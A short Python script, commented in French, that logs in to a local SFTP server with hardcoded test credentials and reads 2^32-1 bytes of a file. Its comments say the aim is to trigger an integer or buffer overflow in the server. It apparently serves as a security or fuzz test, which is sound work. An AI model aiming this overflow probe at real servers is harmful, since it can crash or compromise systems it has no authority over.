import paramiko
import logging
from math import pow

# Activer les logs de débogage
logging.basicConfig(level=logging.DEBUG)

# Détails de connexion
hostname = "127.0.0.1"
port = 22222
username = "jill"
password = "upthehill"

def test_sftp_read():
    try:
        # Créer un client SFTP
        transport = paramiko.Transport((hostname, port))
        transport.connect(username=username, password=password)
        sftp = paramiko.SFTPClient.from_transport(transport)

        # Ouvrir un fichier en mode lecture
        file_path = "README"
        with sftp.open(file_path, "r") as f:
            # Augmenter la limite de requête maximum pour éviter que la requête soit tronquée
            f.MAX_REQUEST_SIZE = int(pow(2, 32))  # Taille maximale de la requête

            # Lire une quantité énorme de données pour provoquer un débordement d'entier ou un dépassement de tampon
            data = f.read(int(pow(2, 32) - 1))  # Lire 2^32 - 1 octets

        print(f"Lecture réussie depuis {file_path}")

    except Exception as e:
        print(f"Erreur lors de la lecture : {e}")

    finally:
        # Fermer la connexion
        if 'sftp' in locals():
            sftp.close()
        if 'transport' in locals():
            transport.close()

if __name__ == "__main__":
    test_sftp_read()